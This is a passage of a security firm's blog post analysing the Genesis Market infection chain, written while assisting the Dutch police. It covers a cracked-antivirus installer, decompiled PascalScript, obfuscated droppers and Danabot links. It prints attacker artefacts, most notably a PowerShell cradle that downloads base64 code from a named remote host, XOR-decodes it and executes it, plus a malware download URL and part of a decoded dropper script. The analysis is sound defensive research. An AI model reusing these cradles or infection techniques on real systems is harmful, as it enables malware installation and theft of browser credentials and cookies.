<!DOCTYPE HTML>

<html lang='en'>
	<head>
		<title>Technical analysis of the Genesis Market &middot; Sector 7</title>
		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
		
		
		
		<link rel="stylesheet" href="/assets/css/main.min.css">
		
		
		<noscript><link rel="stylesheet" href='/assets/css/noscript.css' /></noscript>
		<link rel="alternate" type="application/rss+xml" href="/index.xml" title="Sector 7">
		<link rel="icon" href="/favicon.ico" sizes="32x32">
		<link rel="icon" href="/icon.svg" type="image/svg+xml">
		<link rel="apple-touch-icon" href="/apple-touch-icon.png">
		<link rel="manifest" href="/manifest.webmanifest">
		<meta name="msapplication-TileColor" content="#2b5797">
		<meta name="theme-color" content="#000000">
		<meta property="og:url" content="https://sector7.computest.nl/post/2023-04-technical-analysis-genesis-market/">
  <meta property="og:site_name" content="Sector 7">
  <meta property="og:title" content="Technical analysis of the Genesis Market">
  <meta property="og:description" content="For the last couple of weeks we’ve assisted the Dutch police in investigating the Genesis Market. In case you are unfamiliar with this market, it was used to sell stolen login credentials, browser cookies and online fingerprints (in order to prevent ‘risky sign-in’ detections), by some referred to as IMPaas, or Impersonation-as-a-Service. The market seemed to have started in 2018 and its activities have resulted in approximately two million victims. If you want to know more about this operation, you can read our other blog post. You can also check if your data has been compromised by the market operators via the website of the Dutch police.">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="post">
    <meta property="article:published_time" content="2023-04-05T00:00:00+00:00">
    <meta property="article:modified_time" content="2023-04-05T00:00:00+00:00">
    <meta property="og:image" content="https://sector7.computest.nl/post/2023-04-technical-analysis-genesis-market/header.jpg">

		
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="https://sector7.computest.nl/post/2023-04-technical-analysis-genesis-market/header.jpg">
  <meta name="twitter:title" content="Technical analysis of the Genesis Market">
  <meta name="twitter:description" content="For the last couple of weeks we’ve assisted the Dutch police in investigating the Genesis Market. In case you are unfamiliar with this market, it was used to sell stolen login credentials, browser cookies and online fingerprints (in order to prevent ‘risky sign-in’ detections), by some referred to as IMPaas, or Impersonation-as-a-Service. The market seemed to have started in 2018 and its activities have resulted in approximately two million victims. If you want to know more about this operation, you can read our other blog post. You can also check if your data has been compromised by the market operators via the website of the Dutch police.">

	</head>

	<body lang='en' class="is-preload">

		
			<div id="wrapper">

                
<header id="header">
    <a href="/"><img src="/images/logo.png" class="logo"></a>
</header>

                
<nav id="nav">
    <ul class="links">
        
        
        
        
        
               
        <li class="active">
            <a href="/">Research</a>    
        </li>
        
        
        
        
               
        <li class="">
            <a href="/about/">About</a>    
        </li>
        
        
        
        
               
        <li class="">
            <a href="/contact/">Contact</a>    
        </li>
        
        
        
        
               
        <li class="">
            <a href="https://computest.nl/">Computest</a>    
        </li>
        
        
        
    </ul>
    
    <ul class="icons">
        
        <li><a href="https://x.com/sector7_nl" class="icon fa-brands fa-x-twitter"><span class="label">X</span></a></li>
        
        
        <li><a href="https://infosec.exchange/@sector7" class="icon fa-brands fa-mastodon"><span class="label">Mastodon</span></a></li>
        
        
        
        
        <li><a href="https://www.linkedin.com/company/computest" class="icon fa-brands fa-linkedin"><span class="label">LinkedIn</span></a></li>
        
        
        <li><a href="https://github.com/sector7-nl" class="icon fa-brands fa-github"><span class="label">GitHub</span></a></li>
        
        
        
        
        
        
        <li><a href="/index.xml" class="icon fa-solid fa-rss"><span class="label">RSS</span></a></li>
        
    </ul>
    
</nav>


				
					<div id="main">

						
                        <section class="post">
                            <header class="major">
                                
                                <span class="date">April 5, 2023</span>
                                
                                <h1>Technical analysis of the Genesis Market</h1>
                                <p></p>
                            </header>
                            
                            <div class="image main"><img src="/post/2023-04-technical-analysis-genesis-market/header.jpg" alt="" /></div>
                            
                            <p>For the last couple of weeks we&rsquo;ve assisted the Dutch police in investigating the Genesis Market. In case you are unfamiliar with this market, it was used to sell stolen login credentials, browser cookies and online fingerprints (in order to prevent &lsquo;risky sign-in&rsquo; detections), by some referred to as IMPaas, or Impersonation-as-a-Service. The market seemed to have started in 2018 and its activities have resulted in approximately two million victims. If you want to know more about this operation, you can read our <a href="https://www.computest.nl/en/knowledge-platform/blog/arrests-worldwide-genesis-market-for-online-identity-fraud/">other blog post</a>. You can also check if your data has been compromised by the market operators via the website of the <a href="https://politie.nl/checkyourhack">Dutch police</a>.</p>
<p>In order to operate this market, victims were infected with malware that would steal all data from their browser. The malware was persistent, so that any new information added to the browser later could be stolen as well. Buyers would receive access to a custom Chromium build or browser extension which could load the stolen information of a victim.</p>
<p>We helped the police by analysing the malware that got installed by its victims and by analysing the browser that would be accessible for buyers. The focus was to determine the infection chain of the victim. Additionally, we looked at the browser available to buyers, to see if this would give new insights about the methods used by the market or the buyers. The victim in this case got infected in the second half of February.</p>
<p>Due to the short timespan in which this research had to be conducted, it can be that some details are missing or not 100% accurate. We&rsquo;ve been careful to mention any uncertainties in this article. This article should however give some more insight on how this market operated and can hopefully give future researchers a head start if this market ever re-launches. In addition, it highlights a trend of attackers switching from stealing credentials to stealing session cookies, to cope with the increased adoption of multi-factor and risk-based authentication.</p>
<p>This analysis starts with a write-up of the infection chain and an analysis of the malware that gets dropped. In the second half we dig deeper into the buyers browser extension and how it can be fingerprinted. In case you are interested, Trellix also has a <a href="https://www.trellix.com/en-us/about/newsroom/stories/research/genesis-market-no-longer-feeds-the-evil-cookie-monster.html">writeup of the exploit chain of one of the other victims</a>.</p>
<h1 id="the-infection">The infection</h1>
<h2 id="stage-one-the-loader">Stage one: the loader</h2>
<p>The infection we investigated started (ironically) because the victim wanted to activate his or her anti-virus product. Rather than paying for a subscription, the victim downloaded an illegal activation crack. This ended up uninstalling the original AV product and installing malware instead&hellip;</p>
<p>The activation crack came as an executable, <code>setup.exe</code>, packed in a ZIP file. Looking at the creation date, it seems like the file was created the day before. Possibly to bypass any new AV detection rules. The file is 444 MB in size, but the last 439 MB are all set to 0.</p>
<p>Upon further investigation, <code>setup.exe</code> seemed to be Inno Setup generated installer, with the packaged data being the malicious payload. Luckily, we could quickly test this hypothesis and make use of a wide array of tools to investigate the installer package further:</p>
<ul>
<li><a href="https://github.com/dscharrer/innoextract">innoextract</a></li>
<li><a href="https://innounp.sourceforge.net/">innounp</a></li>
<li><a href="http://www.havysoft.cl/innoextractor.html">InnoExtractor by Havysoft</a></li>
<li><a href="https://github.com/Wack0/IFPSTools.NET">IFPSTools.NET (for disassembling embedded compiled Pascal code)</a></li>
</ul>
<p>Using <code>innoextract</code>, a listing of the packaged files can be retrieved:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ innoextract -e ./setup.exe -d extracted
</span></span><span class="line"><span class="cl">Extracting <span class="s2">&#34;Ino JCcq7ie Supsup&#34;</span> - setup data version 6.1.0 <span class="o">(</span>unicode<span class="o">)</span>
</span></span><span class="line"><span class="cl"> - <span class="s2">&#34;tmp/jcoigasjioqeg.dll&#34;</span> <span class="o">[</span>temp<span class="o">]</span>
</span></span><span class="line"><span class="cl"> - <span class="s2">&#34;tmp/yvibiajwi.dll&#34;</span> <span class="o">[</span>temp<span class="o">]</span>
</span></span><span class="line"><span class="cl"> - <span class="s2">&#34;tmp/isgoisegjoqwg.dll&#34;</span> <span class="o">[</span>temp<span class="o">]</span>
</span></span><span class="line"><span class="cl">Done.
</span></span></code></pre></div><p>And looking at the file signatures:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ <span class="nb">cd</span> extracted <span class="o">&amp;&amp;</span> file tmp/*
</span></span><span class="line"><span class="cl">isgoisegjoqwg.dll: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 1920x1080, components <span class="m">3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">jcoigasjioqeg.dll: JPEG image data, JFIF standard 1.01, resolution <span class="o">(</span>DPI<span class="o">)</span>, density 72x72, segment length 16, Exif Standard: <span class="o">[</span>TIFF image data, big-endian, <span class="nv">direntries</span><span class="o">=</span>7, <span class="nv">orientation</span><span class="o">=</span>upper-left, <span class="nv">xresolution</span><span class="o">=</span>98, <span class="nv">yresolution</span><span class="o">=</span>106, <span class="nv">resolutionunit</span><span class="o">=</span>2, <span class="nv">software</span><span class="o">=</span>Adobe Photoshop CS6 <span class="o">(</span>Windows<span class="o">)</span>, <span class="nv">datetime</span><span class="o">=</span>2023:02:09 01:02:17<span class="o">]</span>, progressive, precision 8, 3840x2160, components <span class="m">3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">yvibiajwi.dll:     PE32 executable <span class="o">(</span>DLL<span class="o">)</span> <span class="o">(</span>GUI<span class="o">)</span> Intel 80386, <span class="k">for</span> MS Windows
</span></span></code></pre></div><p>The two images  seem unrelated to the actual malware. They are a picture of a pride flag and a picture of LeBron James.</p>
<p><img src="setup_images.jpg" alt="Setup images"></p>
<p><code>yvibiajwi.dll</code> stood out because there were multiple identical copies of that DLL in the directories created by <code>setup.exe</code> on the victim&rsquo;s machine, but none of the other two files.</p>
<p>Additionally, the second stage executable <code>setup.tmp</code> loads <code>yvibiajwi.dll</code> at some point. More specifically, the following high level sequence of actions takes place:</p>
<ol>
<li><code>setup.exe</code> creates a new directory, referred to as the setup temp directory from here on, with the format <code>is-&lt;5 uppercase random alphanumeric&gt;.tmp</code> in the directory retrieved by <code>GetTempPath()</code></li>
<li><code>setup.exe</code> writes another executable, <code>setup.tmp</code> to the setup temp directory</li>
<li><code>setup.exe</code> launches <code>setup.tmp</code> with the command line argument <code>/SL5=&quot;$B0638,3246841,963072,&lt;path to setup.exe&gt;&quot;</code></li>
<li><code>setup.tmp</code> opens the <code>setup.exe</code> file, reads data from it and writes <code>yvibiajwi.dll</code> to the setup temp directory</li>
<li><code>setup.tmp</code> launches <code>setup.exe</code> with the command line argument <code>/VERYSILENT</code></li>
<li><code>setup.exe</code> creates a new setup temp directory and writes <code>setup.tmp</code> to the new directory then launches it with a similar <code>/SL5</code> command line argument</li>
<li><code>setup.tmp</code> reads <code>yvibiajwi.dll</code> from the packaged data in <code>setup.exe</code> and writes it to the most recently created setup temp directory</li>
<li><code>setup.tmp</code> loads <code>yvibiajwi.dll</code></li>
</ol>
<p>The second invocation with <code>/VERYSILENT</code> hides all of the installer&rsquo;s windows, per Inno Setup&rsquo;s documentation. Keeping Inno Setup&rsquo;s intended purpose in mind, the above flow seems unusual. It would likely not be standard functionality unless there is extra code embedded into the generated installer, is there?</p>
<h2 id="embedded-pascalscript">Embedded PascalScript</h2>
<p>Inno Setup supports adding specialized tasks to a generated installer beyond simply unpacking the contents. An installer script can specify user-specified yet defined tasks in the <code>[Tasks]</code> section, or programs to execute in the <code>[Run]</code> section. Additionally, an installer script can also specify custom code in <a href="https://en.wikipedia.org/wiki/Pascal_Script">PascalScript</a> to customize the (un-)installation process. <code>setup.exe</code> also includes an embedded compiled script which defines a function to be called on setup initialization. Using <code>innounp</code> and <code>IFPSTools.NET</code>, the embedded PascalScript can be unpacked and decompiled for analysis:</p>
<pre tabindex="0"><code>.version 23

.entry !MAIN

.type primitive(Pointer) Pointer
.type primitive(U32) U32
.type primitive(Variant) Variant
.type primitive(PChar) PChar
.type primitive(Currency) Currency
.type primitive(Extended) Extended
.type primitive(Double) Double
.type primitive(Single) Single
.type primitive(S64) S64
.type primitive(String) String
.type primitive(U32) U32_2
.type primitive(S32) S32
.type primitive(S16) S16
.type primitive(U16) U16
.type primitive(S8) S8
.type(export) funcptr(void()) ANYMETHOD
.type primitive(String) String_2
.type primitive(UnicodeString) UnicodeString
.type primitive(UnicodeString) UnicodeString_2
.type primitive(String) String_3
.type primitive(UnicodeString) UnicodeString_3
.type primitive(WideString) WideString
.type primitive(WideChar) WideChar
.type primitive(WideChar) WideChar_2
.type primitive(Char) Char
.type primitive(U8) U8
.type primitive(U16) U16_2
.type primitive(U32) U32_3
.type(export) primitive(U8) BOOLEAN
.type primitive(U8) U8_2
.type(export) class(TWIZARDFORM) TWIZARDFORM
.type(export) class(TMAINFORM) TMAINFORM
.type(export) class(TUNINSTALLPROGRESSFORM) TUNINSTALLPROGRESSFORM

.global(import) TWIZARDFORM WIZARDFORM
.global(import) TMAINFORM MAINFORM
.global(import) TUNINSTALLPROGRESSFORM UNINSTALLPROGRESSFORM

.function(export) void !MAIN()
	ret

.function(import) external dll(&#34;shell32.dll&#34;,&#34;ShellExecuteW&#34;) __stdcall returnsval shell32.dll!ShellExecuteW(__in __unknown,__in __unknown,__in __unknown,__in __unknown,__in __unknown,__in __unknown)

.function(import) external dll(&#34;files:yvibiajwi.dll&#34;,&#34;RedrawElipse&#34;) __cdecl void files:yvibiajwi.dll!RedrawElipse(__in __unknown)

.function(export) BOOLEAN INITIALIZESETUP()
	pushtype S32 ; StackCount = 1
	pushtype S32 ; StackCount = 2
	pushtype S32 ; StackCount = 3
	pushtype S32 ; StackCount = 4
	pushtype S32 ; StackCount = 5
	pushtype String_3 ; StackCount = 6
	pushtype S32 ; StackCount = 7
	pushtype S32 ; StackCount = 8
	pushtype S32 ; StackCount = 9
	pushvar RetVal ; StackCount = 10
	call WIZARDSILENT
	pop ; StackCount = 9
	assign Var1, S32(3490579)
	assign Var4, S32(6006047)
	add Var4, Var1
	assign Var8, S32(2538214)
	add Var8, Var1
	assign Var4, S32(0)
	pushtype BOOLEAN ; StackCount = 10
	assign Var10, RetVal
	setz Var10
	sfz Var10
	pop ; StackCount = 9
	jf loc_245
	pushtype BOOLEAN ; StackCount = 10
	pushtype S32 ; StackCount = 11
	pushtype S32 ; StackCount = 12
	assign Var12, S32(5)
	pushtype UnicodeString_2 ; StackCount = 13
	assign Var13, UnicodeString_3(&#34;&#34;)
	pushtype UnicodeString_2 ; StackCount = 14
	assign Var14, UnicodeString_3(&#34;/VERYSILENT&#34;)
	pushtype UnicodeString_2 ; StackCount = 15
	pushtype UnicodeString_2 ; StackCount = 16
	assign Var16, UnicodeString_3(&#34;{srcexe}&#34;)
	pushvar Var15 ; StackCount = 17
	call EXPANDCONSTANT
	pop ; StackCount = 16
	pop ; StackCount = 15
	pushtype UnicodeString_2 ; StackCount = 16
	assign Var16, UnicodeString_3(&#34;&#34;)
	pushtype S32 ; StackCount = 17
	assign Var17, S32(0)
	pushvar Var11 ; StackCount = 18
	call shell32.dll!ShellExecuteW
	pop ; StackCount = 17
	pop ; StackCount = 16
	pop ; StackCount = 15
	pop ; StackCount = 14
	pop ; StackCount = 13
	pop ; StackCount = 12
	pop ; StackCount = 11
	le Var10, Var11, S32(32)
	pop ; StackCount = 10
	sfz Var10
	pop ; StackCount = 9
	jf loc_203
	assign Var5, S32(3391624)
	assign Var7, S32(840271)
	add Var7, Var1
	add Var7, S32(24673)
	assign Var7, S32(128817)
	assign RetVal, BOOLEAN(1)
	assign Var9, S32(4775799)
loc_203:
	assign Var6, UnicodeString_3(&#34;HqKTEgDM0D2xEzOpyamSPdX&#34;)
	jump loc_325
loc_245:
	assign Var9, S32(2482010)
	assign Var2, S32(1011875)
	assign Var9, S32(498847)
	assign Var4, S32(1795972)
	pushtype S32 ; StackCount = 10
	assign Var10, S32(490102)
	call files:yvibiajwi.dll!RedrawElipse
	pop ; StackCount = 9
	assign Var6, UnicodeString_3(&#34;cbdmPSyrpKqYV1&#34;)
	assign Var5, S32(1512452)
	pushtype UnicodeString_3 ; StackCount = 10
	assign Var10, Var6
	add Var10, UnicodeString_3(&#34;eIfOyEgNLbgUddEtLD&#34;)
	assign Var6, Var10
	pop ; StackCount = 9
loc_325:
	ret

.function(import) external internal returnsval WIZARDSILENT()

.function(import) external internal returnsval EXPANDCONSTANT(__in __unknown)
</code></pre><p>The functionality implemented by the above script seems to match up with the observed behavior. When the installer process executes it in &lsquo;SILENT&rsquo; mode, it also invokes a function called <code>RedrawElipse</code> in <code>yvibiajwi.dll</code>, which kicks off the next stage of the infection chain.</p>
<h2 id="diving-into-yvibiajwidll">Diving into <code>yvibiajwi.dll</code></h2>
<p>The DLL seems to be written in C++. Upon loading this DLL in IDA, we&rsquo;re finally met with our first taste of control flow obfuscation in the infection chain so far:</p>
<p><img src="obfuscated_first_dll_ida_sc.png" alt="Obfuscation"></p>
<p>The obfuscation techniques applied are limited to runs of bogus Windows/libc API calls that are guarded by an always false if condition or empty loops, so it&rsquo;s relatively simple to ignore them:</p>
<p><img src="deobfuscate_dllmain_first_dll_ida.png" alt="Deobfuscated"></p>
<p>With the control flow cleaned up a bit, we can finally tell that the DLL is another dropper which loads a piece of shellcode and executes it. However, execution of the shellcode is not done on DLL loading in <code>DllMain</code>, instead <code>DllMain</code> only sets up a few pointers and allocates memory for the shellcode and nothing else. In order to execute the embedded shellcode, the exported <code>RedrawElipse</code> function has to be called with the first argument set to <code>0x77A76</code> or <code>490102</code>. Of course, this is exactly how the function is invoked in the embedded PascalScript in <code>setup.exe</code>:</p>
<pre tabindex="0"><code>...
	pushtype S32 ; StackCount = 10
	assign Var10, S32(490102)
	call files:yvibiajwi.dll!RedrawElipse
...
</code></pre><p>Once invoked, <code>RedrawElipse</code> eventually calls <code>crypt32.dll!CryptStringToBinaryA</code> to decode the embedded base64 shellcode block. It then decrypts the decoded block using what seems to be a custom 64-bit block cipher with a hardcoded key then executes the decrypted shellcode.</p>
<p>The shellcode then decrypts an embedded loader executable using the <a href="https://en.wikipedia.org/wiki/XTEA">eXtended Tiny Encryption Algorithm (XTEA)</a> block cipher and uses process hollowing to inject it into a newly spawned <code>explorer.exe</code> process. Afterwards, the injected loader downloads a file from <code>http://194.135.33[.]96/rozemarin.exe</code>, which gets renamed to <code>svchost.exe</code> and executed. It also executes a PowerShell script which downloads some more resources. Both are described in more detail hereafter.</p>
<h2 id="taking-a-closer-look-at-svchostexe">Taking a closer look at <code>svchost.exe</code></h2>
<p>All of the stages prior to the one that loaded this executable involved dropping a static next stage in some shape or form. However, this executable was downloaded and is therefore one of the first elements of the infection chain that might differ from one campaign to the next. Case in point: after extracting the previous stage&rsquo;s executable, we found <a href="https://www.virustotal.com/gui/file/14405eee6b03c4de6fba6b68768a943120c092280e0763ee2672b7ffdf9358bc">a matching submission (by hash) on VirusTotal</a>. In addition, linked to the VirusTotal submission is a <a href="https://www.vmray.com/analyses/_vt/14405eee6b03/report/overview.html">VMRay analysis report</a> showing a different hash for the <code>svchost.exe</code> executable to this one which was acquired from the victim&rsquo;s filesystem.</p>
<p>Focusing on this <code>svchost.exe</code> version: it sets off another series of nested encrypted shellcode stages. The first stage is decrypted and executed, which sets up and executes the second stage and so on. Each stage is encrypted differently from its successor:</p>
<ol>
<li>The first stage is encrypted using the <a href="https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm">Tiny Encryption Algorithm (TEA)</a> block cipher.</li>
<li>The second stage is encrypted using a custom cipher.</li>
<li>The third and final stage is an executable that is embedded in plaintext in the second stage.</li>
</ol>
<p>Interestingly, the final stage is executed through &ldquo;self PE injection&rdquo;. This is achieved by having the second stage shellcode replace the PE of its own process, namely the <code>svchost.exe</code> executable, with the embedded final stage&rsquo;s PE. Afterwards, relocations are updated to match those of the final stage PE, and the second stage shellcode jumps to the now-mapped final stage executable&rsquo;s entry point.</p>
<p>While analyzing the final executable, we noticed that there is quite some similarity between it and a DLL found on the victim&rsquo;s machine which matched the Danabot malware. This makes sense, as we learned that the Genesis Market relied on multiple known botnets in the past. AZORult, GoodKit and Arkei also seem linked to prior infections. The reason we suspected Danabot is because both pieces of code are written in Delphi and are heavily obfuscated using almost identical techniques. We were able to find a much stronger link when analysing the chain starting from <code>svchost.exe</code> dynamically:</p>
<p><img src="svchost_drop_dll_run.png" alt="Dropped and executed DLL by the malicious svchost.exe"></p>
<p>The screenshot above shows that the at some point, <code>svchost.exe</code> writes the malicious <code>Qruhaepdediwhf.dll</code> DLL to the user&rsquo;s <code>%TMP%</code> directory and loads it using <code>rundll32.exe</code>. Shortly after doing so, <code>svchost.exe</code>&rsquo;s process exits while the <code>rundll32.exe</code> process that loaded the malicious DLL continues. Furthermore, we found that both the <code>Qruhaepdediwhf.dll</code> file from the victim&rsquo;s device and the one dropped in the analysis detonation run are almost identical except for what seems to be a randomly generated hex-encoded identifier at offset <code>0x0050695C</code> (exact identifiers modified):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ diff &lt;<span class="o">(</span>hexdump -C original_Qruhaepdediwhf.dll<span class="o">)</span> &lt;<span class="o">(</span>hexdump -C dropped_Qruhaepdediwhf.dll<span class="o">)</span>
</span></span><span class="line"><span class="cl">328300,328302c328300,328302
</span></span><span class="line"><span class="cl">&lt; <span class="m">00506950</span>  <span class="m">04</span> <span class="m">55</span> <span class="m">41</span> <span class="m">00</span> 0c <span class="m">55</span> <span class="m">41</span> <span class="m">00</span>  <span class="m">14</span> <span class="m">55</span> <span class="m">41</span> <span class="m">00</span> <span class="m">41</span> <span class="m">41</span> <span class="m">41</span> <span class="m">41</span>  <span class="p">|</span>.UA..UA..UA.AAAA<span class="p">|</span>
</span></span><span class="line"><span class="cl">&lt; <span class="m">00506960</span>  <span class="m">41</span> <span class="m">41</span> <span class="m">41</span> <span class="m">41</span> <span class="m">41</span> <span class="m">41</span> <span class="m">41</span> <span class="m">41</span>  <span class="m">41</span> <span class="m">41</span> <span class="m">41</span> <span class="m">41</span> <span class="m">41</span> <span class="m">41</span> <span class="m">41</span> <span class="m">41</span>  <span class="p">|</span>AAAAAAAAAAAAAAAA<span class="p">|</span>
</span></span><span class="line"><span class="cl">&lt; <span class="m">00506970</span>  <span class="m">41</span> <span class="m">41</span> <span class="m">41</span> <span class="m">41</span> <span class="m">41</span> <span class="m">41</span> <span class="m">41</span> <span class="m">41</span>  <span class="m">41</span> <span class="m">41</span> <span class="m">41</span> <span class="m">41</span> 7a 7a <span class="m">00</span> <span class="m">00</span>  <span class="p">|</span>AAAAAAAAAAAAzz..<span class="p">|</span>
</span></span><span class="line"><span class="cl">---
</span></span><span class="line"><span class="cl">&gt; <span class="m">00506950</span>  <span class="m">04</span> <span class="m">55</span> <span class="m">41</span> <span class="m">00</span> 0c <span class="m">55</span> <span class="m">41</span> <span class="m">00</span>  <span class="m">14</span> <span class="m">55</span> <span class="m">41</span> <span class="m">00</span> <span class="m">42</span> <span class="m">42</span> <span class="m">42</span> <span class="m">42</span>  <span class="p">|</span>.UA..UA..UA.BBBB<span class="p">|</span>
</span></span><span class="line"><span class="cl">&gt; <span class="m">00506960</span>  <span class="m">42</span> <span class="m">42</span> <span class="m">42</span> <span class="m">42</span> <span class="m">42</span> <span class="m">42</span> <span class="m">42</span> <span class="m">42</span>  <span class="m">42</span> <span class="m">42</span> <span class="m">42</span> <span class="m">42</span> <span class="m">42</span> <span class="m">42</span> <span class="m">42</span> <span class="m">42</span>  <span class="p">|</span>BBBBBBBBBBBBBBBB<span class="p">|</span>
</span></span><span class="line"><span class="cl">&gt; <span class="m">00506970</span>  <span class="m">42</span> <span class="m">42</span> <span class="m">42</span> <span class="m">42</span> <span class="m">42</span> <span class="m">42</span> <span class="m">42</span> <span class="m">42</span>  <span class="m">42</span> <span class="m">42</span> <span class="m">42</span> <span class="m">42</span> 7a 7a <span class="m">00</span> <span class="m">00</span>  <span class="p">|</span>BBBBBBBBBBBBzz..<span class="p">|</span>
</span></span></code></pre></div><p>At this stage, we stopped analysing the infection chain further since the links between the artefacts on the victim&rsquo;s device and the suspected initial infection vector have been sufficiently clarified. The remainder of this document focuses on the parts of the malware that are more strongly related to the market&rsquo;s illicit activities.</p>
<h2 id="downloading-remote-resources">Downloading remote resources</h2>
<p>As mentioned earlier, the final loader executable that is executed by the decoded shellcode in <code>yvibiajwi.dll</code> not only drops <code>svchost.exe</code>, but also runs the following PowerShell command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$w</span> <span class="p">=</span> <span class="nb">new-object</span> <span class="n">System</span><span class="p">.</span><span class="py">Net</span><span class="p">.</span><span class="n">Webclient</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$bs</span> <span class="p">=</span> <span class="nv">$w</span><span class="p">.</span><span class="py">DownloadString</span><span class="p">(</span><span class="s2">&#34;http://tchk-1[.]com/v3.bs64&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">Byte[]</span><span class="p">]</span> <span class="nv">$x</span><span class="p">=[</span><span class="no">Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$bs</span><span class="p">.</span><span class="py">Replace</span><span class="p">(</span><span class="s2">&#34;!&#34;</span><span class="p">,</span> <span class="s2">&#34;A&#34;</span><span class="p">).</span><span class="py">Replace</span><span class="p">(</span><span class="s2">&#34;@&#34;</span><span class="p">,</span> <span class="s2">&#34;W&#34;</span><span class="p">).</span><span class="py">Replace</span><span class="p">(</span><span class="s2">&#34;$&#34;</span><span class="p">,</span> <span class="s2">&#34;x&#34;</span><span class="p">).</span><span class="py">Replace</span><span class="p">(</span><span class="s2">&#34;%&#34;</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span><span class="p">).</span><span class="py">Replace</span><span class="p">(</span><span class="s2">&#34; ^&#34;</span><span class="p">,</span> <span class="s2">&#34;z&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="p">=</span> <span class="mf">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">-lt</span> <span class="nv">$x</span><span class="p">.</span><span class="n">Count</span><span class="p">;</span> <span class="nv">$i</span><span class="p">++)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$x</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$x</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">-bxor</span> <span class="mf">255</span><span class="p">)</span> <span class="o">-bxor</span> <span class="mf">11</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">iex</span><span class="p">([</span><span class="no">System.Text.Encoding</span><span class="p">]::</span><span class="n">UTF8</span><span class="p">.</span><span class="py">GetString</span><span class="p">(</span><span class="nv">$x</span><span class="p">))</span>
</span></span></code></pre></div><p>This downloads a new PowerShell command from the remote host <code>tchk-1[.]com</code>, which gets executed. Further analysis of this host revealed that it is just a proxy (using HAProxy), forwarding requests to other hosts.</p>
<p>Besides <code>v3.bs64</code> there seem to be other versions as well, such as <code>5.ps1</code>. In general it seems to do either contain encoded files inline, or download these files separately. These files constitute an unpacked browser extension, which (in case of our victim) gets saved in <code>$localAppData\Default</code>. Then the script iterates over all start menu items, looking for shortcuts to browsers based on Chromium, such as Google Chrome and Brave. It modifies these shortcuts by appending <code>--load-extension=&lt;extension path&gt;</code> to each shortcut such that the just dropped extension gets loaded.</p>
<p>Below you can find the decoded version of <code>v3.bs64</code>, though encoded data has been removed for readability:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$strangeDesktop</span> <span class="p">=</span> <span class="p">[</span><span class="no">Environment</span><span class="p">]::</span><span class="n">GetFolderPath</span><span class="p">(</span><span class="s2">&#34;CommonDesktopDirectory&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$programFiles</span> <span class="p">=</span> <span class="p">[</span><span class="no">Environment</span><span class="p">]::</span><span class="n">GetFolderPath</span><span class="p">(</span><span class="s2">&#34;ProgramFiles&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$appData</span> <span class="p">=</span> <span class="p">[</span><span class="no">Environment</span><span class="p">]::</span><span class="n">GetFolderPath</span><span class="p">(</span><span class="s2">&#34;ApplicationData&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$userProfile</span> <span class="p">=</span> <span class="p">[</span><span class="no">Environment</span><span class="p">]::</span><span class="n">GetFolderPath</span><span class="p">(</span><span class="s2">&#34;UserProfile&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$localAppData</span> <span class="p">=</span> <span class="p">[</span><span class="no">Environment</span><span class="p">]::</span><span class="n">GetFolderPath</span><span class="p">(</span><span class="s2">&#34;LocalApplicationData&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$encodedData</span> <span class="p">=</span> <span class="vm">@</span><span class="p">{</span><span class="s2">&#34;src/functions/exchangeSettings.js&#34;</span><span class="p">=</span><span class="s2">&#34;...&#34;</span><span class="p">...}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$destination</span> <span class="p">=</span> <span class="s2">&#34;</span><span class="nv">$localAppData</span><span class="s2">\Default&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">-not</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="nv">$destination</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nb">New-Item</span> <span class="nv">$destination</span> <span class="n">-ItemType</span> <span class="n">Directory</span> <span class="p">|</span> <span class="nb">Out-Null</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
